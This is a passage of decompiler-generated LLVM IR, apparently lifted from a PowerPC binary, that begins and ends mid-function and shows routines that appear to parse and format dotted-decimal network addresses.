  %v1_1000bdac = udiv i32 %v0_1000bdac, 256
  store i32 %v1_1000bdac, i32* %r0.global-to-local, align 4
  %v1_1000bdb0 = trunc i32 %v0_1000bdac to i8
  %v3_1000bdb0 = add i32 %v0_1000bda0, 1
  %v4_1000bdb0 = inttoptr i32 %v3_1000bdb0 to i8*
  store i8 %v1_1000bdb0, i8* %v4_1000bdb0, align 1
  %v0_1000bdb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bdb4 = trunc i32 %v0_1000bdb4 to i8
  %v2_1000bdb4 = load i32, i32* @r31, align 4
  %v3_1000bdb4 = inttoptr i32 %v2_1000bdb4 to i8*
  store i8 %v1_1000bdb4, i8* %v3_1000bdb4, align 1
  %v0_1000bdb8 = load i32, i32* @r29, align 4
  store i32 %v0_1000bdb8, i32* @r26, align 4
  %v0_1000bdbc = load i32, i32* @r31, align 4
  %v1_1000bdbc = add i32 %v0_1000bdbc, 2
  store i32 %v1_1000bdbc, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000be0030 = inttoptr i32 %v0_1000bdb8 to i8*
  %v2_1000be0031 = load i8, i8* %v1_1000be0030, align 1
  %v3_1000be0032 = zext i8 %v2_1000be0031 to i32
  store i32 %v3_1000be0032, i32* %r3.global-to-local, align 4
  store i32 268484104, i32* @lr, align 4
  %v1_1000be0433 = call i32 @function_1000caac(i32 %v3_1000be0032)
  store i32 %v1_1000be0433, i32* %r3.global-to-local, align 4
  store i32 %v1_1000be0433, i32* @r30, align 4
  %v3_1000be0834 = icmp eq i32 %v1_1000be0433, 0
  br i1 %v3_1000be0834, label %dec_label_pc_1000be10, label %dec_label_pc_1000bd38.lr.ph

dec_label_pc_1000bd38.lr.ph:                      ; preds = %dec_label_pc_1000bd2c, %dec_label_pc_1000bdac
  %v1_1000be043341 = phi i32 [ %v1_1000be0433, %dec_label_pc_1000bdac ], [ %v1_1000be043339, %dec_label_pc_1000bd2c ]
  br label %dec_label_pc_1000bd38

dec_label_pc_1000bdcc:                            ; preds = %dec_label_pc_1000bd70
  %v3_1000bdcc = icmp eq i32 %v0_1000bd70, 46
  br i1 %v3_1000bdcc, label %dec_label_pc_1000bdd4, label %dec_label_pc_1000beac

dec_label_pc_1000bdd4:                            ; preds = %dec_label_pc_1000bdcc
  %v0_1000bdd4 = load i32, i32* @r31, align 4
  %v1_1000bdd4 = add i32 %v0_1000bdd4, 4
  store i32 %v1_1000bdd4, i32* @r30, align 4
  %v1_1000bdd8 = load i32, i32* @r27, align 4
  %v3_1000bdd8 = icmp ugt i32 %v1_1000bdd4, %v1_1000bdd8
  br i1 %v3_1000bdd8, label %dec_label_pc_1000beac, label %dec_label_pc_1000bde0

dec_label_pc_1000bde0:                            ; preds = %dec_label_pc_1000bdd4
  %v0_1000bde4 = load i32, i32* @r26, align 4
  store i32 %v0_1000bde4, i32* %r3.global-to-local, align 4
  store i32 268484076, i32* @lr, align 4
  %v3_1000bde8 = call i32 @function_1000bbdc(i32 %v0_1000bde4, i32 %v0_1000bdd4)
  store i32 %v3_1000bde8, i32* %r3.global-to-local, align 4
  %v0_1000bdec = load i32, i32* @r30, align 4
  store i32 %v0_1000bdec, i32* @r31, align 4
  %v2_1000bdf0 = icmp sgt i32 %v3_1000bde8, 0
  br i1 %v2_1000bdf0, label %dec_label_pc_1000be34, label %dec_label_pc_1000beac

dec_label_pc_1000bdfc:                            ; preds = %dec_label_pc_1000bd58
  store i32 1, i32* @r23, align 4
  %v0_1000be00.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000be00.backedge

dec_label_pc_1000be00.backedge:                   ; preds = %dec_label_pc_1000bdfc, %dec_label_pc_1000bd88
  %v0_1000be00.be = phi i32 [ %v0_1000be00.pre.pre, %dec_label_pc_1000bdfc ], [ %v0_1000bd8c, %dec_label_pc_1000bd88 ]
  %v1_1000be00 = inttoptr i32 %v0_1000be00.be to i8*
  %v2_1000be00 = load i8, i8* %v1_1000be00, align 1
  %v3_1000be00 = zext i8 %v2_1000be00 to i32
  store i32 %v3_1000be00, i32* %r3.global-to-local, align 4
  store i32 268484104, i32* @lr, align 4
  %v1_1000be04 = call i32 @function_1000caac(i32 %v3_1000be00)
  store i32 %v1_1000be04, i32* %r3.global-to-local, align 4
  store i32 %v1_1000be04, i32* @r30, align 4
  %v3_1000be08 = icmp eq i32 %v1_1000be04, 0
  br i1 %v3_1000be08, label %dec_label_pc_1000be10, label %dec_label_pc_1000bd38

dec_label_pc_1000be10:                            ; preds = %dec_label_pc_1000be00.backedge, %dec_label_pc_1000bd2c, %dec_label_pc_1000bdac
  %v0_1000be10 = load i32, i32* @r23, align 4
  %v3_1000be10 = icmp eq i32 %v0_1000be10, 0
  %v0_1000be78.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000be10, label %dec_label_pc_1000be34, label %dec_label_pc_1000be18

dec_label_pc_1000be18:                            ; preds = %dec_label_pc_1000be10
  %v1_1000be18 = add i32 %v0_1000be78.pre.pre, 2
  store i32 %v1_1000be18, i32* %r0.global-to-local, align 4
  %v1_1000be1c = load i32, i32* @r27, align 4
  %v3_1000be1c = icmp ugt i32 %v1_1000be18, %v1_1000be1c
  br i1 %v3_1000be1c, label %dec_label_pc_1000beac, label %dec_label_pc_1000be24

dec_label_pc_1000be24:                            ; preds = %dec_label_pc_1000be18
  %v0_1000be24 = load i32, i32* @r28, align 4
  %v1_1000be24 = udiv i32 %v0_1000be24, 256
  store i32 %v1_1000be24, i32* %r0.global-to-local, align 4
  %v1_1000be28 = trunc i32 %v0_1000be24 to i8
  %v3_1000be28 = add i32 %v0_1000be78.pre.pre, 1
  %v4_1000be28 = inttoptr i32 %v3_1000be28 to i8*
  store i8 %v1_1000be28, i8* %v4_1000be28, align 1
  %v0_1000be2c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000be2c = trunc i32 %v0_1000be2c to i8
  %v2_1000be2c = load i32, i32* @r31, align 4
  %v3_1000be2c = inttoptr i32 %v2_1000be2c to i8*
  store i8 %v1_1000be2c, i8* %v3_1000be2c, align 1
  %v0_1000be30 = load i32, i32* @r31, align 4
  %v1_1000be30 = add i32 %v0_1000be30, 2
  store i32 %v1_1000be30, i32* @r31, align 4
  br label %dec_label_pc_1000be34

dec_label_pc_1000be34:                            ; preds = %dec_label_pc_1000be10, %dec_label_pc_1000bde0, %dec_label_pc_1000be24
  %v0_1000be78.pre = phi i32 [ %v0_1000bdec, %dec_label_pc_1000bde0 ], [ %v1_1000be30, %dec_label_pc_1000be24 ], [ %v0_1000be78.pre.pre, %dec_label_pc_1000be10 ]
  %v0_1000be34 = load i32, i32* @r24, align 4
  %v3_1000be34 = icmp eq i32 %v0_1000be34, 0
  %v1_1000be78.pre = load i32, i32* @r27, align 4
  %v4_1000be78 = icmp eq i32 %v0_1000be78.pre, %v1_1000be78.pre
  br i1 %v3_1000be34, label %dec_label_pc_1000be78, label %dec_label_pc_1000be3c

dec_label_pc_1000be3c:                            ; preds = %dec_label_pc_1000be34
  %v2_1000be40 = sub i32 %v0_1000be78.pre, %v0_1000be34
  store i32 %v2_1000be40, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000be78, label %dec_label_pc_1000beac, label %dec_label_pc_1000be60.preheader

dec_label_pc_1000be60.preheader:                  ; preds = %dec_label_pc_1000be3c
  %v3_1000be6024 = icmp slt i32 %v2_1000be40, 1
  %v2_1000be6426 = add i32 %v2_1000be40, -1
  store i32 %v2_1000be6426, i32* %r10.global-to-local, align 4
  %v2_1000be6827 = add i32 %v1_1000be78.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000be6024, label %dec_label_pc_1000be78.thread, label %dec_label_pc_1000be54

dec_label_pc_1000be54:                            ; preds = %dec_label_pc_1000be60.preheader, %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge
  %v0_1000be54 = phi i32 [ %v0_1000be54.pre, %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge ], [ %v0_1000be34, %dec_label_pc_1000be60.preheader ]
  %v2_1000be6829 = phi i32 [ %v2_1000be68, %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge ], [ %v2_1000be6827, %dec_label_pc_1000be60.preheader ]
  %v2_1000be6428 = phi i32 [ %v2_1000be64, %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge ], [ %v2_1000be6426, %dec_label_pc_1000be60.preheader ]
  %v2_1000be54 = add i32 %v0_1000be54, %v2_1000be6428
  %v3_1000be54 = inttoptr i32 %v2_1000be54 to i8*
  %v4_1000be54 = load i8, i8* %v3_1000be54, align 1
  %v5_1000be54 = zext i8 %v4_1000be54 to i32
  store i32 %v5_1000be54, i32* %r0.global-to-local, align 4
  %v3_1000be58 = inttoptr i32 %v2_1000be6829 to i8*
  store i8 %v4_1000be54, i8* %v3_1000be58, align 1
  %v0_1000be5c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000be5c = load i32, i32* @r24, align 4
  %v2_1000be5c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000be5c = trunc i32 %v0_1000be5c to i8
  %v4_1000be5c = add i32 %v2_1000be5c, %v1_1000be5c
  %v5_1000be5c = inttoptr i32 %v4_1000be5c to i8*
  store i8 %v3_1000be5c, i8* %v5_1000be5c, align 1
  %v0_1000be60.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000be60.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000be68.pre = load i32, i32* @r27, align 4
  %v3_1000be60 = icmp slt i32 %v1_1000be60.pre, %v0_1000be60.pre
  %v2_1000be64 = sub i32 %v1_1000be60.pre, %v0_1000be60.pre
  store i32 %v2_1000be64, i32* %r10.global-to-local, align 4
  %v1_1000be6c = add i32 %v0_1000be60.pre, 1
  store i32 %v1_1000be6c, i32* %r9.global-to-local, align 4
  br i1 %v3_1000be60, label %dec_label_pc_1000be78.thread, label %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge

dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge: ; preds = %dec_label_pc_1000be54
  %v2_1000be68 = sub i32 %v1_1000be68.pre, %v0_1000be60.pre
  %v0_1000be54.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000be54

dec_label_pc_1000be78.thread:                     ; preds = %dec_label_pc_1000be54, %dec_label_pc_1000be60.preheader
  %v0_1000be74.lcssa = phi i32 [ %v1_1000be78.pre, %dec_label_pc_1000be60.preheader ], [ %v1_1000be68.pre, %dec_label_pc_1000be54 ]
  store i32 %v0_1000be74.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000be80

dec_label_pc_1000be78:                            ; preds = %dec_label_pc_1000be34
  br i1 %v4_1000be78, label %dec_label_pc_1000be80, label %dec_label_pc_1000beac

dec_label_pc_1000be80:                            ; preds = %dec_label_pc_1000be78.thread, %dec_label_pc_1000be78
  %v0_1000be80 = load i32, i32* @r22, align 4
  store i32 %v0_1000be80, i32* @r3, align 4
  store i32 %v2_1000bcfc, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000be90.328 to i32), i32* @lr, align 4
  %v0_1000be8c = call i32 @function_10006d8c()
  store i32 %v0_1000be8c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb0

dec_label_pc_1000be98:                            ; preds = %dec_label_pc_1000bcdc
  %v0_1000be98 = call i32 @function_10004b48()
  store i32 %v0_1000be98, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000bea4 = inttoptr i32 %v0_1000be98 to i32*
  store i32 97, i32* %v2_1000bea4, align 4
  %v0_1000beb4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb0

dec_label_pc_1000beac:                            ; preds = %dec_label_pc_1000bda0, %dec_label_pc_1000bd94, %dec_label_pc_1000bd58, %dec_label_pc_1000bd80, %dec_label_pc_1000be3c, %dec_label_pc_1000bde0, %dec_label_pc_1000bdcc, %dec_label_pc_1000be78, %dec_label_pc_1000bd20, %dec_label_pc_1000be18, %dec_label_pc_1000bdd4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb0

dec_label_pc_1000beb0:                            ; preds = %dec_label_pc_1000be98, %dec_label_pc_1000be80, %dec_label_pc_1000bce8, %dec_label_pc_1000beac
  %v0_1000beb4 = phi i32 [ %v0_1000beb4.pre, %dec_label_pc_1000be98 ], [ 1, %dec_label_pc_1000be80 ], [ %v3_1000bcf0, %dec_label_pc_1000bce8 ], [ 0, %dec_label_pc_1000beac ]
  store i32 %v0_1000bcc0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000beb4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000beb4

; uselistorder directives
  uselistorder i32 %v0_1000beb4, { 1, 0 }
  uselistorder i32 %v2_1000be64, { 1, 0 }
  uselistorder i32 %v0_1000be60.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000be78, { 1, 0 }
  uselistorder i32 %v0_1000be78.pre, { 1, 0 }
  uselistorder i32 %v0_1000be24, { 1, 0 }
  uselistorder i32 %v0_1000be78.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000be04, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000bdac, { 1, 0 }
  uselistorder i32 %v1_1000bd5c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 1, 2, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 14, 15, 11, 12, 3, 2, 13, 5, 4, 16, 17, 1, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1000caac, { 2, 1, 0 }
  uselistorder i32 268484104, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000bbdc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000beb0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000beac, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000be80, { 1, 0 }
  uselistorder label %dec_label_pc_1000be54, { 1, 0 }
  uselistorder label %dec_label_pc_1000be34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000be10, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bd38.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd38, { 1, 0 }
}

define i32 @function_1000bec8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf20.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000bec8 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000bef4 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000bef4, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000bf04.331 to i32), i32* @lr, align 4
  %v3_1000bf00 = call i32 @function_10006e28(i32 %v2_1000bef4, i32 0, i32 15)
  store i32 %v3_1000bf00, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000bfc42 = load i32, i32* @r1, align 4
  store i32 %v0_1000bfc42, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000bf20

dec_label_pc_1000bf20:                            ; preds = %dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge, %dec_label_pc_1000bf20.lr.ph
  %v2_1000bf40 = phi i32 [ %v2_1000bfc4, %dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge ], [ %v0_1000bfc42, %dec_label_pc_1000bf20.lr.ph ]
  %v0_1000bf34 = phi i32 [ %v0_1000bfc4, %dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge ], [ %v0_1000bfc42, %dec_label_pc_1000bf20.lr.ph ]
  %v0_1000bf24 = phi i32 [ %v1_1000bfc4, %dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge ], [ 0, %dec_label_pc_1000bf20.lr.ph ]
  %v1_1000bf2c = phi i32 [ %v1_1000bf20.pre, %dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge ], [ 0, %dec_label_pc_1000bf20.lr.ph ]
  %v0_1000bf20 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000bf20 = add i32 %v0_1000bf20, %v1_1000bf2c
  %v3_1000bf20 = inttoptr i32 %v2_1000bf20 to i8*
  %v4_1000bf20 = load i8, i8* %v3_1000bf20, align 1
  %v5_1000bf20 = zext i8 %v4_1000bf20 to i32
  store i32 %v5_1000bf20, i32* %r10.global-to-local, align 4
  store i32 %v0_1000bf24, i32* %r8.global-to-local, align 4
  %v1_1000bf28 = add i32 %v0_1000bf24, 1
  store i32 %v1_1000bf28, i32* %r11.global-to-local, align 4
  store i32 %v2_1000bf20, i32* %r3.global-to-local, align 4
  %v1_1000bf30 = load i32, i32* @r28, align 4
  %v2_1000bf30 = udiv i32 %v5_1000bf20, %v1_1000bf30
  %v2_1000bf34 = add i32 %v1_1000bf28, %v0_1000bf34
  store i32 %v2_1000bf34, i32* %r6.global-to-local, align 4
  %v1_1000bf38 = add nuw nsw i32 %v2_1000bf30, 48
  %v1_1000bf3c = urem i32 %v1_1000bf38, 256
  store i32 %v1_1000bf3c, i32* %r0.global-to-local, align 4
  %v1_1000bf40 = trunc i32 %v1_1000bf38 to i8
  %v3_1000bf40 = add i32 %v2_1000bf40, 8
  %v4_1000bf40 = inttoptr i32 %v3_1000bf40 to i8*
  store i8 %v1_1000bf40, i8* %v4_1000bf40, align 1
  %v0_1000bf44 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000bf44 = icmp eq i32 %v0_1000bf44, 48
  %v0_1000bf4c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bf4c = load i32, i32* %r5.global-to-local, align 4
  %v2_1000bf4c = udiv i32 %v0_1000bf4c, %v1_1000bf4c
  store i32 %v2_1000bf4c, i32* %r9.global-to-local, align 4
  br i1 %v3_1000bf44, label %dec_label_pc_1000bf4c, label %dec_label_pc_1000bf78

dec_label_pc_1000bf4c:                            ; preds = %dec_label_pc_1000bf20
  %v2_1000bf50 = udiv i32 %v2_1000bf4c, %v1_1000bf4c
  %tmp18 = mul i32 %v2_1000bf50, -10
  %v2_1000bf58 = add i32 %v2_1000bf4c, 48
  %v1_1000bf5c = add i32 %v2_1000bf58, %tmp18
  store i32 %v1_1000bf5c, i32* %r9.global-to-local, align 4
  %v1_1000bf60 = urem i32 %v1_1000bf5c, 256
  store i32 %v1_1000bf60, i32* %r0.global-to-local, align 4
  %v1_1000bf64 = trunc i32 %v1_1000bf5c to i8
  %v2_1000bf64 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000bf64 = add i32 %v2_1000bf64, 8
  %v4_1000bf64 = inttoptr i32 %v3_1000bf64 to i8*
  store i8 %v1_1000bf64, i8* %v4_1000bf64, align 1
  %v0_1000bf68 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000bf68 = icmp eq i32 %v0_1000bf68, 48
  br i1 %v3_1000bf68, label %dec_label_pc_1000bf94, label %dec_label_pc_1000bf70

dec_label_pc_1000bf70:                            ; preds = %dec_label_pc_1000bf4c
  %v0_1000bf70 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000bf70, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bf94

dec_label_pc_1000bf78:                            ; preds = %dec_label_pc_1000bf20
  %v0_1000bf7c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bf7c = add i32 %v0_1000bf7c, 1
  store i32 %v1_1000bf7c, i32* %r8.global-to-local, align 4
  %v2_1000bf80 = udiv i32 %v2_1000bf4c, %v1_1000bf4c
  %v1_1000bf84 = mul i32 %v2_1000bf80, 10
  store i32 %v1_1000bf84, i32* %r0.global-to-local, align 4
  %v2_1000bf88 = sub i32 %v2_1000bf4c, %v1_1000bf84
  %v1_1000bf8c = add i32 %v2_1000bf88, 48
  store i32 %v1_1000bf8c, i32* %r9.global-to-local, align 4
  %v1_1000bf90 = trunc i32 %v1_1000bf8c to i8
  %v2_1000bf90 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000bf90 = add i32 %v2_1000bf90, 8
  %v4_1000bf90 = inttoptr i32 %v3_1000bf90 to i8*
  store i8 %v1_1000bf90, i8* %v4_1000bf90, align 1
  br label %dec_label_pc_1000bf94

dec_label_pc_1000bf94:                            ; preds = %dec_label_pc_1000bf4c, %dec_label_pc_1000bf70, %dec_label_pc_1000bf78
  %v0_1000bf94 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000bf94 = inttoptr i32 %v0_1000bf94 to i8*
  %v2_1000bf94 = load i8, i8* %v1_1000bf94, align 1
  %v3_1000bf94 = zext i8 %v2_1000bf94 to i32
  %v0_1000bf98 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bf98 = add i32 %v0_1000bf98, 1
  %v0_1000bf9c = load i32, i32* @r1, align 4
  %v2_1000bf9c = add i32 %v0_1000bf9c, %v0_1000bf98
  store i32 %v2_1000bf9c, i32* %r10.global-to-local, align 4
  %v2_1000bfa0 = add i32 %v1_1000bf98, %v0_1000bf9c
  store i32 %v2_1000bfa0, i32* %r8.global-to-local, align 4
  %v1_1000bfa4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000bfa4 = udiv i32 %v3_1000bf94, %v1_1000bfa4
  %v1_1000bfa8 = add i32 %v0_1000bf98, 2
  store i32 %v1_1000bfa8, i32* %r11.global-to-local, align 4
  %v0_1000bfac = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bfac = add i32 %v0_1000bfac, 1
  store i32 %v1_1000bfac, i32* %r4.global-to-local, align 4
  %v1_1000bfb0 = mul nuw nsw i32 %v2_1000bfa4, 10
  store i32 %v1_1000bfb0, i32* %r0.global-to-local, align 4
  %v2_1000bfb4 = sub nsw i32 %v3_1000bf94, %v1_1000bfb0
  %v1_1000bfb8 = add nsw i32 %v2_1000bfb4, 48
  store i32 %v1_1000bfb8, i32* %r9.global-to-local, align 4
  %v1_1000bfbc = trunc i32 %v1_1000bfb8 to i8
  %v3_1000bfbc = add i32 %v2_1000bf9c, 8
  %v4_1000bfbc = inttoptr i32 %v3_1000bfbc to i8*
  store i8 %v1_1000bfbc, i8* %v4_1000bfbc, align 1
  %v0_1000bfc0 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000bfc0 = trunc i32 %v0_1000bfc0 to i8
  %v2_1000bfc0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000bfc0 = add i32 %v2_1000bfc0, 8
  %v4_1000bfc0 = inttoptr i32 %v3_1000bfc0 to i8*
  store i8 %v1_1000bfc0, i8* %v4_1000bfc0, align 1
  %v0_1000bfc4 = load i32, i32* @r1, align 4
  %v1_1000bfc4 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000bfc4 = add i32 %v1_1000bfc4, %v0_1000bfc4
  store i32 %v2_1000bfc4, i32* %r7.global-to-local, align 4
  %v0_1000bfc8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bfc8 = add i32 %v0_1000bfc8, -1
  store i32 %v1_1000bfc8, i32* %ctr.global-to-local, align 4
  %v2_1000bfc8 = icmp eq i32 %v1_1000bfc8, 0
  br i1 %v2_1000bfc8, label %dec_label_pc_1000bfcc, label %dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge

dec_label_pc_1000bf94.dec_label_pc_1000bf20_crit_edge: ; preds = %dec_label_pc_1000bf94
  %v1_1000bf20.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000bf20

dec_label_pc_1000bfcc:                            ; preds = %dec_label_pc_1000bf94
  %v2_1000bfcc = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000bfcc, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000bfd4 = add i32 %v1_1000bfc4, %v2_1000bfcc
  store i32 %v2_1000bfd4, i32* %r9.global-to-local, align 4
  store i32 %v2_1000bfcc, i32* @r3, align 4
  %v3_1000bfdc = add i32 %v2_1000bfd4, -1
  %v4_1000bfdc = inttoptr i32 %v3_1000bfdc to i8*
  store i8 0, i8* %v4_1000bfdc, align 1
  %v0_1000bfe0 = call i32 @function_10006ed8()
  store i32 %v0_1000bfe0, i32* %r3.global-to-local, align 4
  %v1_1000bfe4 = load i32, i32* @r30, align 4
  %v3_1000bfe4 = icmp ugt i32 %v0_1000bfe0, %v1_1000bfe4
  br i1 %v3_1000bfe4, label %dec_label_pc_1000bfec, label %dec_label_pc_1000c000

dec_label_pc_1000bfec:                            ; preds = %dec_label_pc_1000bfcc
  %v0_1000bfec = call i32 @function_10004b48()
  store i32 %v0_1000bfec, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000bff8 = inttoptr i32 %v0_1000bfec to i32*
  store i32 28, i32* %v2_1000bff8, align 4
  %v0_1000c014.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c010

dec_label_pc_1000c000:                            ; preds = %dec_label_pc_1000bfcc
  %v0_1000c000 = load i32, i32* @r29, align 4
  store i32 %v0_1000c000, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bfcc, i32* %r4.global-to-local, align 4
  %v2_1000c008 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000c008 = call i32 @function_10006eb8(i32 %v0_1000c000, i8* %v2_1000c008)
  store i32 %v3_1000c008, i32* %r3.global-to-local, align 4
  store i32 %v3_1000c008, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c010

dec_label_pc_1000c010:                            ; preds = %dec_label_pc_1000bfec, %dec_label_pc_1000c000
  %v0_1000c014 = phi i32 [ %v0_1000c014.pre, %dec_label_pc_1000bfec ], [ %v3_1000c008, %dec_label_pc_1000c000 ]
  store i32 %v0_1000bec8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c014, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c014

; uselistorder directives
  uselistorder i32 %v0_1000c014, { 1, 0 }
  uselistorder i32 %v2_1000bfcc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000bfc8, { 1, 0 }
  uselistorder i32 %v2_1000bfc4, { 1, 0 }
  uselistorder i32 %v0_1000bf98, { 1, 0, 2 }
  uselistorder i32 %v1_1000bf5c, { 1, 0, 2 }
  uselistorder i32 %v2_1000bf4c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000bf38, { 1, 0 }
  uselistorder i32 %v0_1000bf24, { 1, 0 }
  uselistorder i32 %v0_1000bfc42, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14 }
  uselistorder i32 15, { 0, 1, 7, 6, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_1000c010, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf94, { 2, 1, 0 }
}

define i32 @function_1000c028(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c028:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
